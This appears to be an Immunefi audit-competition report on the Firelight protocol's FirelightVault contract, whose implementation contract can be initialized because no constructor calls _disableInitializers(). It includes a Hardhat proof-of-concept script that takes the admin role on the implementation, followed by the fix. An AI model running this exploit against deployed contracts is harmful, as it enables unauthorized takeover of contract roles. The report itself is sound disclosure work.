# 59023 sc low unprotected implementation contract initializer allows unauthorized admin role assignment leading to potential governance manipulation

**Submitted on Nov 7th 2025 at 20:11:48 UTC by @piyushmali for** [**Audit Comp | Firelight**](https://immunefi.com/audit-competition/audit-comp-firelight)

* **Report ID:** #59023
* **Report Type:** Smart Contract
* **Report severity:** Low
* **Target:** <https://github.com/firelight-protocol/firelight-core/blob/main/contracts/FirelightVault.sol>
* **Impacts:**
  * Manipulation of governance voting result deviating from voted outcome and resulting in a direct change from intended effect of original results
  * Griefing (e.g. no profit motive for an attacker, but damage to the users or the protocol)

## Description

### **Brief/Intro**

The FirelightVault implementation contract lacks protection against direct initialization, allowing any attacker to call the `initialize()` function on the implementation contract (not the proxy) and gain `DEFAULT_ADMIN_ROLE` privileges on it. While this does not directly compromise the proxy's storage or user funds due to the separation of concerns in the proxy pattern, it creates a critical security risk where an attacker controls the implementation contract's state. This could lead to confusion, potential denial-of-service scenarios, and manipulation if the implementation contract has any self-referential logic or if future upgrades rely on implementation state.

### **Vulnerability Details**

The FirelightVault contract is deployed using OpenZeppelin's upgradeable proxy pattern (UUPS). In this pattern, there are two separate contracts:

1. **Proxy contract** - holds all storage and delegates calls to the implementation
2. **Implementation contract** - contains the logic but should never be initialized

The vulnerability exists because the implementation contract does not have a constructor that calls `_disableInitializers()` to prevent initialization. This is a critical security requirement for all OpenZeppelin upgradeable contracts.

**Vulnerable Code Location:** `contracts/FirelightVault.sol` lines 146-196

```solidity
function initialize(
    IERC20 _asset,
    string memory _name,
    string memory _symbol,
    bytes memory _initParams
) public initializer {
    InitParams memory initParams = abi.decode(_initParams, (InitParams));
    __ERC20_init(_name, _symbol);
    __ERC4626_init(_asset);
    __Pausable_init();
    __ReentrancyGuard_init();
    __AccessControl_init();
    
    // ... validation checks ...
    
    _grantRole(DEFAULT_ADMIN_ROLE, initParams.defaultAdmin);  // ← Attacker gains this role
    // ... other role assignments ...
}
```

**The Missing Protection:**

There is no constructor like this:

```solidity
/// @custom:oz-upgrades-unsafe-allow constructor
constructor() {
    _disableInitializers();
}
```

**Attack Flow:**

1. Attacker obtains the implementation contract address from the proxy's EIP-1967 storage slot (`0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc`)
2. Attacker calls `initialize()` directly on the implementation contract with their own parameters
3. The `initializer` modifier allows this because the implementation has never been initialized
4. Attacker's address receives `DEFAULT_ADMIN_ROLE` on the implementation contract
5. The implementation contract's state is now controlled by the attacker

### **Impact Details**

**Immediate Impact:**

* Attacker gains `DEFAULT_ADMIN_ROLE` on the implementation contract
* Attacker can grant themselves all other roles (RESCUER\_ROLE, BLOCKLIST\_ROLE, PAUSE\_ROLE, etc.) on the implementation
* Implementation contract state variables can be manipulated by the attacker

**Potential Consequences:**

1. **Confusion and Trust Issues:** Users and monitoring systems may detect that the implementation contract has been initialized with unexpected values, causing confusion and loss of trust in the protocol.
2. **Upgrade Manipulation Risk:** If future upgrade logic or validation checks reference the implementation contract's state (which should never happen but could be introduced accidentally), the attacker could manipulate upgrade processes.
3. **Denial of Service:** The attacker could potentially call functions on the implementation that cause it to enter an invalid state, which might affect future upgrades or cause revert conditions.
4. **Governance Confusion:** If any governance mechanisms reference the implementation contract (even indirectly), the attacker's control over admin roles could create voting or decision-making issues.

**Severity Justification:** While the proxy's storage remains safe and user funds are not directly at risk, this vulnerability violates a fundamental security principle of upgradeable contracts. The implementation should be immutable and uninitialized. This is classified as **griefing** because the attacker gains no direct financial benefit but can cause significant damage to the protocol's integrity and operations.

### **References**

* OpenZeppelin Upgradeable Contracts Documentation: <https://docs.openzeppelin.com/upgrades-plugins/1.x/writing-upgradeable#initializing\\_the\\_implementation\\_contract>
* OpenZeppelin Security Advisory on Implementation Initialization: <https://docs.openzeppelin.com/contracts/4.x/api/proxy#Initializable>
* Similar vulnerability in Meta Pool (mpETH) - 2025
* EIP-1967 Proxy Storage Slots: <https://eips.ethereum.org/EIPS/eip-1967>

***

## Proof of Concept

### **Proof of Concept**

**Test File:** `test/pocs/a_implementation_initializer.js`

**Prerequisites:**

```bash
cd firelight-core
npm install
npx hardhat compile
```

**Step-by-Step Reproduction:**

**Step 1:** Deploy the vault using the normal proxy deployment (this happens in the test setup)

**Step 2:** Extract the implementation contract address from the proxy

```javascript
const implementationAddress = await upgrades.erc1967.getImplementationAddress(
    await firelight_vault.getAddress()
);
// Result: 0xDc64a140Aa3E981100a9becA4E685f962f0cF6C9
```

**Step 3:** Attach to the implementation contract directly (bypassing the proxy)

```javascript
const FirelightVaultFactory = await ethers.getContractFactory('FirelightVault');
const implementation = FirelightVaultFactory.attach(implementationAddress);
```

**Step 4:** Prepare malicious initialization parameters

```javascript
const abi_coder = ethers.AbiCoder.defaultAbiCoder();
const InitParams = {
    defaultAdmin: attacker.address,  // ← Attacker's address
    limitUpdater: attacker.address,
    blocklister: attacker.address,
    pauser: attacker.address,
    periodConfigurationUpdater: attacker.address,
    depositLimit: ethers.parseUnits('50000', 6),
    periodConfigurationDuration: 604800
};
const init_params = abi_coder.encode(
    ['address','address','address','address','address','uint256','uint48'], 
    Object.values(InitParams)
);
```

**Step 5:** Call initialize on the implementation contract

```javascript
const tx = await implementation.initialize(
    tokenAddress,
    'Malicious',
    'MAL',
    init_params
);
await tx.wait();
// Transaction succeeds: 0x6e3f0697aa1580947f7b49fff0f5c91f735469e9c0c5788c1c30e34f55f7c7c0
```

**Step 6:** Verify attacker gained admin role on implementation

```javascript
const DEFAULT_ADMIN_ROLE = '0x0000000000000000000000000000000000000000000000000000000000000000';
const hasRole = await implementation.hasRole(DEFAULT_ADMIN_ROLE, attacker.address);
console.log(hasRole); // true ✓

const version = await implementation.contractVersion();
console.log(version); // 1 ✓

const depositLimit = await implementation.depositLimit();
console.log(depositLimit); // 50000000000 ✓
```

**Run the Complete PoC:**

```bash
npx hardhat test test/pocs/a_implementation_initializer.js
```

**Expected Output:**

```
PoC A: Implementation Initializer Attack
  [PoC A] Implementation address: 0xDc64a140Aa3E981100a9becA4E685f962f0cF6C9
  [PoC A] Proxy address: 0x5FC8d32690cc91D4c39d9d3abcBD16989F875707
  [PoC A] Attempting to initialize implementation contract...
  [PoC A] ⚠️  CRITICAL: Implementation initialization SUCCEEDED!
  [PoC A] Transaction hash: 0x6e3f0697aa1580947f7b49fff0f5c91f735469e9c0c5788c1c30e34f55f7c7c0
  [PoC A] ⚠️  VULNERABILITY: Implementation contract can be initialized!
  [PoC A] Implementation contractVersion after init: 1
  [PoC A] Implementation has DEFAULT_ADMIN_ROLE for deployer: true
  [PoC A] Implementation depositLimit: 50000000000
```

**Concrete Evidence:**

* Implementation Address: `0xDc64a140Aa3E981100a9becA4E685f962f0cF6C9`
* Attack Transaction: `0x6e3f0697aa1580947f7b49fff0f5c91f735469e9c0c5788c1c30e34f55f7c7c0`
* Attacker Role Verification: `hasRole(DEFAULT_ADMIN_ROLE, attacker) = true`
* Implementation State Modified: `contractVersion = 1`, `depositLimit = 50000000000`

**Remediation:**

Add this constructor to `FirelightVault.sol`:

```solidity
/// @custom:oz-upgrades-unsafe-allow constructor
constructor() {
    _disableInitializers();
}
```

This will permanently disable initialization on the implementation contract while still allowing the proxy to be initialized normally.
